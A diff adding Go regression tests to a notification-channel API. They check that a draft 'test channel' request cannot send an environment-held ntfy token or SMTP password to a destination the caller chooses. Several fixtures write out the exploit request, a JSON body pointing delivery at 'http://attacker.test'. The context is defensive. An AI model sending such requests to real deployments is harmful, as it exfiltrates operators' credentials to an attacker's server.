@@ -363,3 +363,107 @@ func TestScheduleChangesWakeTheScheduler(t *testing.T) {
 		t.Errorf("wakes = %d, want 3 after create, update and delete", sched.wakes)
 	}
 }
+
+// The hole this closes, stated as the exploit: one unauthenticated POST naming a label the
+// environment holds a credential for, and a destination of the caller's choosing.
+//
+// Before the guard, the override was applied to the request's own config and delivered, so the
+// deployment's SMTP password or ntfy token arrived at the caller's server.
+func TestDraftTestCannotCarryEnvironmentSecretsToARequestDestination(t *testing.T) {
+	t.Setenv("SMARTSERVE_CHANNEL_CRITICAL_ALERTS_TOKEN", "deployment-secret")
+	notifier := &fakeNotifier{outcome: notify.OutcomeSent, types: []string{"ntfy"}}
+	srv, _, _, _ := newTestServer(t, Options{Notifier: notifier})
+
+	rec := do(t, srv, http.MethodPost, "/api/channels/test",
+		`{"type":"ntfy","label":"Critical alerts",`+
+			`"config":{"server":"http://attacker.test","topic":"x","token":""}}`, nil)
+
+	if rec.Code != http.StatusConflict {
+		t.Fatalf("status = %d, want 409, body = %s", rec.Code, rec.Body.String())
+	}
+	if len(notifier.sent) != 0 {
+		t.Fatalf("a draft was delivered with an environment credential: %+v", notifier.sent)
+	}
+}
+
+// A draft of a channel that exists, with its destination untouched, still tests: that is the
+// editor's Test button doing its job, and the secret goes exactly where it already went.
+func TestSavedChannelDraftStillUsesEnvironmentSecrets(t *testing.T) {
+	t.Setenv("SMARTSERVE_CHANNEL_CRITICAL_ALERTS_TOKEN", "deployment-secret")
+	notifier := &fakeNotifier{outcome: notify.OutcomeSent, types: []string{"ntfy"}}
+	srv, st, _, _ := newTestServer(t, Options{Notifier: notifier})
+
+	ch := store.Channel{
+		Type: "ntfy", Label: "Critical alerts", Enabled: true,
+		Config: `{"server":"https://ntfy.lan","topic":"alerts","token":""}`, Events: "[]",
+	}
+	id, err := st.CreateChannel(context.Background(), ch)
+	if err != nil {
+		t.Fatalf("CreateChannel: %v", err)
+	}
+
+	rec := do(t, srv, http.MethodPost, "/api/channels/test",
+		fmt.Sprintf(`{"id":%d,"type":"ntfy","label":"Critical alerts",`+
+			`"config":{"server":"https://ntfy.lan","topic":"alerts","token":""}}`, id), nil)
+	if rec.Code != http.StatusOK {
+		t.Fatalf("status = %d, want 200, body = %s", rec.Code, rec.Body.String())
+	}
+	if len(notifier.sent) != 1 {
+		t.Fatalf("deliveries = %d, want 1", len(notifier.sent))
+	}
+	// The handler's job is to allow the resolution, not to perform it: the dispatcher applies the
+	// overrides on its own send path, which is why the guard has to be decided here.
+	allow, refusal := srv.draftOverridesAllowed(context.Background(), channelBody{
+		ID: id, Type: "ntfy", Label: "Critical alerts",
+		Config: []byte(`{"server":"https://ntfy.lan","topic":"alerts","token":""}`),
+	})
+	if !allow || refusal != "" {
+		t.Errorf("an unchanged draft of a saved channel must keep its credentials; got allowed=%v refusal=%q", allow, refusal)
+	}
+}
+
+// Moving the destination is what turns a test into an exfiltration, so a draft that changes it gets
+// no credential even when it names a real channel.
+func TestDraftWithAChangedDestinationGetsNoSecret(t *testing.T) {
+	t.Setenv("SMARTSERVE_CHANNEL_CRITICAL_ALERTS_TOKEN", "deployment-secret")
+	notifier := &fakeNotifier{outcome: notify.OutcomeSent, types: []string{"ntfy"}}
+	srv, st, _, _ := newTestServer(t, Options{Notifier: notifier})
+
+	ch := store.Channel{
+		Type: "ntfy", Label: "Critical alerts", Enabled: true,
+		Config: `{"server":"https://ntfy.lan","topic":"alerts","token":""}`, Events: "[]",
+	}
+	id, err := st.CreateChannel(context.Background(), ch)
+	if err != nil {
+		t.Fatalf("CreateChannel: %v", err)
+	}
+
+	rec := do(t, srv, http.MethodPost, "/api/channels/test",
+		fmt.Sprintf(`{"id":%d,"type":"ntfy","label":"Critical alerts",`+
+			`"config":{"server":"http://attacker.test","topic":"alerts","token":""}}`, id), nil)
+	if rec.Code != http.StatusConflict {
+		t.Fatalf("status = %d, want 409, body = %s", rec.Code, rec.Body.String())
+	}
+	if len(notifier.sent) != 0 {
+		t.Fatalf("the secret was sent to a changed destination: %+v", notifier.sent)
+	}
+}
+
+// One label, one channel: the label names the environment variables, so a second channel sharing it
+// would be offered the first one's credentials.
+func TestDuplicateChannelLabelIsRefused(t *testing.T) {
+	notifier := &fakeNotifier{outcome: notify.OutcomeSent, types: []string{"ntfy"}}
+	srv, _, _, _ := newTestServer(t, Options{Notifier: notifier})
+
+	first := do(t, srv, http.MethodPost, "/api/channels",
+		`{"type":"ntfy","label":"Critical alerts","config":{"topic":"a"}}`, nil)
+	if first.Code != http.StatusOK && first.Code != http.StatusCreated {
+		t.Fatalf("first create = %d, body = %s", first.Code, first.Body.String())
+	}
+
+	second := do(t, srv, http.MethodPost, "/api/channels",
+		`{"type":"ntfy","label":"Critical alerts","config":{"topic":"b"}}`, nil)
+	if second.Code != http.StatusConflict {
+		t.Fatalf("second create = %d, want 409, body = %s", second.Code, second.Body.String())
+	}
+}
